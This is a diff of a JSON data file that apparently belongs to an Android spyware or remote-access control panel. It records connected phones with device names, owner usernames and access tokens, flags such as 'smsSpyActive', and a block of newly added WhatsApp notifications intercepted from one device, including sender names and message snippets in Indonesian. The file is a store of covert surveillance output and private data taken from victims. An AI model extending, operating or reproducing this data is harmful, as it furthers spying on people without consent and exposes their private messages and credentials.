@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781111649,
+    "lastSeen": 1776781114563,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781113842,
+    "lastSeen": 1776781115041,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781112124,
+    "lastSeen": 1776781114977,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,70 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎4 pesan dari 2 chat",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781115643
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎10 pesan dari 3 chat",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781114962
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎All Buyer Pegasus ( Full Update ) (6 pesan): ~ Zal7Sex",
+        "content": "ch",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781114892
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "nopal cmpk",
+        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781114668
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Arkan",
+        "content": "p",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781114509
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎10 pesan dari 3 chat",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781114316
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎All Buyer Pegasus ( Full Update ) (6 pesan): ~ Zal7Sex",
+        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781114277
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "nopal cmpk",
+        "content": "Menunggu pesan ini. Ini mungkin membutuhkan waktu beberapa saat.",
+        "time": "21/04 21:18",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781114127
+      },
       {
         "appName": "WhatsApp",
         "sender": "Arkan",
